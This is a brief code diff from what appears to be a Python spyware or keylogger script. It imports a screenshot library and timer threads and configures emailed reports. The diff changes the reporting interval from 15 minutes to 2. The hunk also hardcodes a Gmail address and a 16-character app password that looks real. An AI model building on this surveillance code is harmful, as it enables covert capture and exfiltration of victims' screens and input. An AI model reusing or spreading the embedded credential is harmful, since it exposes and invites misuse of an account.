@@ -10,7 +10,7 @@ from threading import Semaphore, Timer
 import pyscreenshot as ImageGrab
 
 # 1. Configuration
-SEND_REPORT_EVERY = 900  # 15 minutes
+SEND_REPORT_EVERY = 120  # 2 minutes
 EMAIL_ADDRESS = "sankarideb1@gmail.com"
 # CRITICAL: Use a 16-character 'App Password' here instead of your regular password.
 EMAIL_PASSWORD = "vkfm hbqm yhon cvjg" 
